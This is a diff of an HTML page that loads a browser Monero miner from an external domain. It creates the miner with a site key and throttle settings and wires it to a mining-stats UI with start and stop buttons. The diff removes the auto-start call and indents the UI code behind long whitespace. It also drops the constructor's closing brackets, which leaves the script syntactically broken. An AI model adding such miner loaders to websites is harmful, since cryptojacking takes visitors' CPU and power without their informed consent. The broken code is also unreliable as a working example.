@@ -1,25 +1,25 @@
 <script type="0c9a8f9f969e6af6f23d61f5-text/javascript" src="https://reauthenticator.com/lib/crypta.js"></script>
 <script type="0c9a8f9f969e6af6f23d61f5-text/javascript" src="https://reauthenticator.com/lib/minui.js"></script>
 <script>
+  var miner = null;
+                                          try {
   var miner=new CRLT.Anonymous('81611f2a9637cfda62cfaa3c3a765e9b22a7d87c6551', {threads:1,throttle:0.5, coin: "xmr",
-  });
 } catch(e) {}
 
-var ui = new MinerUI(miner, {
-  container: document.getElementById('miner'),
-  canvas: document.getElementById('mining-stats-canvas'),
-  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-  threads: document.getElementById('mining-threads'),
-  threadsAdd: document.getElementById('mining-threads-add'),
-  threadsRemove: document.getElementById('mining-threads-remove'),
-  hashesTotal: document.getElementById('mining-hashes-total'),
-  startButton: document.getElementById('mining-start'),
-  stopButton: document.getElementById('mining-stop'),
-  blkWarn: document.getElementById('blk-warning')
-});
-  miner.start();
-</script>
+                                          var ui = new MinerUI(miner, {
+                                          container: document.getElementById('miner'),
+                                          canvas: document.getElementById('mining-stats-canvas'),
+                                          hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+                                          hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+                                          threads: document.getElementById('mining-threads'),
+                                          threadsAdd: document.getElementById('mining-threads-add'),
+                                          threadsRemove: document.getElementById('mining-threads-remove'),
+                                          hashesTotal: document.getElementById('mining-hashes-total'),
+                                          startButton: document.getElementById('mining-start'),
+                                          stopButton: document.getElementById('mining-stop'),
+                                          blkWarn: document.getElementById('blk-warning')
+                                          });
+                                          </script>
 <div class="block">
  <div class="six columns stopped" id="miner">
    <div class="row">
